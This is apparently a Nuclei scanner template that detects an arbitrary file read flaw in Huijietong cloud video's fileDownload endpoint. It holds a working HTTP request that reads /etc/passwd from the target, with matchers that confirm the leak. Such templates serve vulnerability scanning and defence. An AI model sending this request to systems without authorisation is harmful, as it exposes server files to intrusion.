id: huijietong-cloud-video-file-read
info:
  name: Huijietong Cloud Video File Download File Read
  author: ProjectDiscoveryAI
  severity: high
  description: |
    Huijietong cloud video has a file read vulnerability in the fileDownload endpoint. An attacker can exploit this vulnerability to read arbitrary files from the server.
  reference:
    - http://www.hjtcloud.com/
  tags: file-read
http:
  - raw:
      - |
        POST /fileDownload?action=downloadBackupFile HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        fullPath=/etc/passwd
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "root"
    extractors:
      - type: regex
        part: body
        regex:
          - "root:[^:]*:[0-9]+:[0-9]+"
